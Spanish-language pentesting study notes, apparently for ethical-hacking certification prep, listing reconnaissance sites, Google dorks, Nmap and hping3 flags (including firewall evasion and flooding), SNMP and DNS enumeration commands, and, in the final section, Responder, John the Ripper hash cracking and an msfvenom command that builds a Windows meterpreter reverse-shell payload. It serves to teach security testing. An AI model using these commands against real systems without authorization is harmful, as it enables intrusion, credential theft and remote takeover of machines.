2.	FOOTPRINTING

#Google Dorks
Operador	Descripción	Ejemplo
“ ”	Coincide exactamente con el texto entre comillas dobles	“Behackerpro”
–	Excluye de la búsqueda el término que va después del signo “-”	malware -ransomware
+	Incluye el término de va después del signo “+”	ciber +resiliencia
#	Busca un hashtag	#pentesting
OR	Devuelve resultados sobre un término u otro	Smartphone OR tablet
|	Devuelve resultados sobre un término u otro. El mismo OR	blackhat | defcon
( )	Utilizado para agrupar operadores	(ballmer OR gates) windows
cache:	Muestra la página en cache	cache:www.eltiempo.co.
inurl:	Busca el termino escrito dentro de la URL de los sitios indexados	inurl:admin.php
site:	Busca todo lo relacionado con el termino escrito como sitio	site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
filetype:	Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	filetype:log
intitle:	Busca el termino escrito dentro del título	intitle:mikrotik
allintitle:	Devuelve resultados que coincidan en el título con el término escrito	allintitle:”Noticias Principales de Colombia”
intext:	Busca páginas que en su texto contienen el termino escrito 	intext:owasp
allintext:	Devuelve todos los resultados que contengan todas las palabras especificadas	allintext:”asterisk digium

Information Gathering

•	https://larutadelhacker.com/google-dorks-busquedas-avanzadas-en-google/ Google Dorks
•	https://dorksearch.com/ Google Dorks
•	https://citizenevidence.amnestyusa.org/ Youtube Data viewer
•	https://www.searchftps.net/ Search FTPs
•	https://www.shodan.io/ Information Gathering
•	https://github.com/JavierOlmedo/shodan-filters Filters Shodan
•	https://sitereport.netcraft.com/ Information Gathering
•	https://www.peekyou.com/ People Search
•	https://tineye.com/ People Search
•	https://yandex.com/images/ People Search
•	TheHarvester – Information Gathering
•	https://search.censys.io/ - Footprinting passive
•	https://www.zoomeye.org/ Footprinting passive
•	https://github.com/sherlock-project/sherlock People Search
•	Ping -l (preload many packets Ej: 1300) -f (flood ping) -i (time) -n (amount)
•	https://website.informer.com/ Web Site Footprinting
•	http://www.webextractor.com/ Extractor de información de paginas web
•	https://www.httrack.com/ Web Site Copier
•	https://emailtracker.website/pro  Email tracker
•	https://whois.domaintools.com/ Whois Lookup
•	nslookup - dns footprinting
•	http://www.kloth.net/services/nslookup.php DNS lookup
•	https://www.yougetsignal.com/ DNS lookup
•	dnsrecon – Tool parrot 
•	https://www.arin.net/  DNS lookup
•	tracert – Tool (-h amount salts)

3.	SCANNING
•	Nmap
	-PE: Ping ICMP ECHO scan
	-PU: UDP ping Scan
	-PR: arp ping scan 
-PP: ICMP timestamp Ping Scan
-PM: ICMP address MASK Ping Scan
-PS: TCP SYN Ping Scan
-PA: TCP ACK Ping Scan
-PO: IP Protocol Ping Scan
-n: deshabilitar resolución de dns
-sn: deshabilitar escaneo de puertos
-Pn: Deshabilitar ping scan
-sT: TCP scan
-sS: stealth scan
-sX: Xmas scan FIN, PSH, and URG flags
-sA: ACK scan
-sU: UDP scan
-O: OS detection
-sV: versión services
-sC: scripts mas utilizados sobre los servicios encontrados
-A: escaneo agresivo, incluye -O -sV -sC –traceroute
NetworkIP/Mask – Search IPs on network
-f: fragmentación de paquetes para evadir firewalls
-g <port>: source port manipulation
-mtu: especificar cantidad máxima de transmisión de paquetes (8)
-D RND:<num> : genera N IP address
•	Angry IP Scanner – Tool Windows
•	MegaPing – Tool Windows
•	NetScanTools – Tool Windows
•	Hping3
-p: range ports
-U: URG flag
-P: Push flag
-F: fin flag
-c: count flags
--scan: scan ports
--udp: UDP scan 
--rand-source: IP random
--data: tamaño del cuerpo del paquete 
--flood: técnica de Inundación de TCP
•	OS Detection TTL
 


•	Unicornscan – Scan Network
-I: Immediate scan
-v: verbose
•	Colasoft Packet Builder – network scanner
•	
4.	ENUMERATION
Nbstat – NetBIOS enumeration
Net – NetBIOS enumeration
NetBiosEnumeratior – Tool Windows
Snmp-check – SNMP Enumeration
Comando snmpget con SNMPv1:
 
snmpget -v1 -c [cadena de comunidad] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv2:
snmpget -v2c -c [cadena de comunidad] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (autenticación, pero sin cifrado):
snmpget -v3 -l authNoPriv -u [nombre de usuario] -a MD5 -A [hash MD5 de la contraseña de usuario] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (autenticación y cifrado):
snmpget -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] -x DES -X [contraseña DES] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (sin autenticación ni cifrado):
snmpget -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID para update check]

Comando snmpwalk con SNMPv1:
 
snmpwalk -v1 -c [cadena de comunidad] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv2:
snmpwalk -v2c -c [cadena de comunidad] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (autenticación, pero sin cifrado):
snmpwalk -v3 -l authNoPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (autenticación y cifrado):
snmpwalk -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] -x DES -X [contraseña DES] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (sin autenticación ni cifrado):
snmpwalk -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID de la MIB de la info rmación del sistema]

•	SoftPerfect Network Scanner – Tool Windows
•	AD Explorer – LDAP Enumerator
•	Dig – DNS Enumeration
Axfr – transferencia de Zona (@NS)
Ns – name server
•	Nslookup 
Set type=<query>
•	Dnsrecon
-z DNSSEC
MX
SOA
NS
A
AAAA
SPF 
TXT
•	Global Network Inventory – Tool Windows
•	Enum4linux
5.	VULNERABILITY ANALYSIS
Nessus 
OpenVAS
Nikto – Web Vulnerability
arachni
6.	SYSTEMS HACKING

Responder -I <interface>
Jhon The Ripper
John -list=formats (Escogemos un formato)
 	John --format=RAW-md5 --wordlist=<RUTA> <HASH>

Hash-identifier <HASH> - Identificar HASH

L0phtCrack7 – Tool Windows

https://www.exploit-db.com Exploit DB
https://www.variotdbs.pl/  search exploit
https://sploitus.com/ search exploit
searchsploit – tool linux
nsfvenom -p windows/meterpeter/reverse_tcp –platform windows -a x86 -f exe LHOST=<> LPORT=<> -o salida
https://github.com/PowerShellMafia/PowerSploit - Post explotacion 
TheFatRat
 Inmunity Debugger
